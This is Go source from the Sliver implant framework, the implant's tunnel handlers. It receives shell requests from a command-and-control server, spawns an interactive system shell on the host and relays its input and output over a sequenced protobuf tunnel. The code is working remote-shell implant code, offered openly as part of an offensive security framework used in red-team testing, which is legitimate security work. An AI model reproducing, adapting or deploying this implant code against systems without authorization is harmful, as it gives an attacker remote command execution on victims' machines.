// +build windows linux darwin

package handlers

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"io"
	"time"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/bishopfox/sliver/implant/sliver/shell"
	"github.com/bishopfox/sliver/implant/sliver/transports"
	"github.com/bishopfox/sliver/protobuf/sliverpb"

	"github.com/golang/protobuf/proto"
)

const (
	readBufSize = 1024
)

var (
	tunnelHandlers = map[uint32]TunnelHandler{
		sliverpb.MsgShellReq: shellReqHandler,

		sliverpb.MsgTunnelData:  tunnelDataHandler,
		sliverpb.MsgTunnelClose: tunnelCloseHandler,
	}

	// TunnelID -> Sequence Number -> Data
	tunnelDataCache = map[uint64]map[uint64]*sliverpb.TunnelData{}
)

// GetTunnelHandlers - Returns a map of tunnel handlers
func GetTunnelHandlers() map[uint32]TunnelHandler {
	return tunnelHandlers
}

func tunnelCloseHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
	tunnelClose := &sliverpb.TunnelData{
		Closed: true,
	}
	proto.Unmarshal(envelope.Data, tunnelClose)
	tunnel := connection.Tunnel(tunnelClose.TunnelID)
	if tunnel != nil {
		// {{if .Config.Debug}}
		log.Printf("[tunnel] Closing tunnel with id %d", tunnel.ID)
		// {{end}}
		connection.RemoveTunnel(tunnel.ID)
		tunnel.Reader.Close()
		tunnel.Writer.Close()
		if _, ok := tunnelDataCache[tunnel.ID]; ok {
			delete(tunnelDataCache, tunnel.ID)
		}
	}
}

func tunnelDataHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
	tunnelData := &sliverpb.TunnelData{}
	proto.Unmarshal(envelope.Data, tunnelData)
	tunnel := connection.Tunnel(tunnelData.TunnelID)
	if tunnel != nil {

		if _, ok := tunnelDataCache[tunnelData.TunnelID]; !ok {
			tunnelDataCache[tunnelData.TunnelID] = map[uint64]*sliverpb.TunnelData{}
		}

		// Since we have no guarantees that we will receive tunnel data in the correct order, we need
		// to ensure we write the data back to the reader in the correct order. The server will ensure
		// that TunnelData protobuf objects are numbered in the correct order using the Sequence property.
		// Similarly we ensure that any data we write-back to the server is also numbered correctly. To
		// reassemble the data, we just dump it into the cache and then advance the writer until we no longer
		// have sequential data. So we can receive `n` number of incorrectly ordered Protobuf objects and
		// correctly write them back to the reader.

		// {{if .Config.Debug}}
		log.Printf("[tunnel] Cache tunnel %d (seq: %d)", tunnel.ID, tunnelData.Sequence)
		// {{end}}
		tunnelDataCache[tunnel.ID][tunnelData.Sequence] = tunnelData

		// NOTE: The read/write semantics can be a little mind boggling, just remember we're reading
		// from the server and writing to the tunnel's reader (e.g. stdout), so that's why ReadSequence
		// is use here whereas WriteSequence is used for data written back to the server

		// Go through cache and write all sequential data to the reader
		cache := tunnelDataCache[tunnel.ID]
		for recv, ok := cache[tunnel.ReadSequence]; ok; recv, ok = cache[tunnel.ReadSequence] {
			// {{if .Config.Debug}}
			log.Printf("[tunnel] Write %d bytes to tunnel %d (read seq: %d)", len(recv.Data), recv.TunnelID, recv.Sequence)
			// {{end}}
			tunnel.Writer.Write(recv.Data)

			// Delete the entry we just wrote from the cache
			delete(cache, tunnel.ReadSequence)
			tunnel.ReadSequence++ // Increment sequence counter
		}

	} else {
		// {{if .Config.Debug}}
		log.Printf("Received data for nil tunnel %d", tunnelData.TunnelID)
		// {{end}}
	}
}

// tunnelWriter - Sends data back to the server based on data read()
// I know the reader/writer stuff is a little hard to keep track of
type tunnelWriter struct {
	tun  *transports.Tunnel
	conn *transports.Connection
}

func (tw tunnelWriter) Write(data []byte) (n int, err error) {
	data, err = proto.Marshal(&sliverpb.TunnelData{
		Sequence: tw.tun.WriteSequence, // The tunnel write sequence
		TunnelID: tw.tun.ID,
		Data:     data,
	})
	// {{if .Config.Debug}}
	log.Printf("[tunnelWriter] Write %d bytes (write seq: %d)", len(data), tw.tun.WriteSequence)
	// {{end}}
	tw.tun.WriteSequence++ // Increment write sequence
	tw.conn.Send <- &sliverpb.Envelope{
		Type: sliverpb.MsgTunnelData,
		Data: data,
	}
	return len(data), err
}

func shellReqHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {

	shellReq := &sliverpb.ShellReq{}
	err := proto.Unmarshal(envelope.Data, shellReq)
	if err != nil {
		return
	}

	shellPath := shell.GetSystemShellPath(shellReq.Path)
	systemShell := shell.StartInteractive(shellReq.TunnelID, shellPath, shellReq.EnablePTY)
	go systemShell.StartAndWait()
	// Wait for the process to actually spawn
	for {
		if systemShell.Command.Process == nil {
			time.Sleep(time.Second)
		} else {
			break
		}
	}
	tunnel := &transports.Tunnel{
		ID:     shellReq.TunnelID,
		Reader: systemShell.Stdout,
		Writer: systemShell.Stdin,
	}
	connection.AddTunnel(tunnel)

	shellResp, _ := proto.Marshal(&sliverpb.Shell{
		Pid:      uint32(systemShell.Command.Process.Pid),
		Path:     shellReq.Path,
		TunnelID: shellReq.TunnelID,
	})
	connection.Send <- &sliverpb.Envelope{
		ID:   envelope.ID,
		Data: shellResp,
	}

	// Cleanup function with arguments
	cleanup := func(reason string) {
		// {{if .Config.Debug}}
		log.Printf("Closing tunnel %d (%s)", tunnel.ID, reason)
		// {{end}}
		connection.RemoveTunnel(tunnel.ID)
		tunnelClose, _ := proto.Marshal(&sliverpb.TunnelData{
			Closed:   true,
			TunnelID: tunnel.ID,
		})
		connection.Send <- &sliverpb.Envelope{
			Type: sliverpb.MsgTunnelClose,
			Data: tunnelClose,
		}
	}

	go func() {
		for {
			tWriter := tunnelWriter{
				tun:  tunnel,
				conn: connection,
			}
			_, err := io.Copy(tWriter, tunnel.Reader)
			if systemShell.Command.ProcessState != nil {
				if systemShell.Command.ProcessState.Exited() {
					cleanup("process terminated")
					return
				}
			}
			if err == io.EOF {
				cleanup("EOF")
				return
			}
		}
	}()

	// {{if .Config.Debug}}
	log.Printf("Started shell with tunnel ID %d", tunnel.ID)
	// {{end}}

}
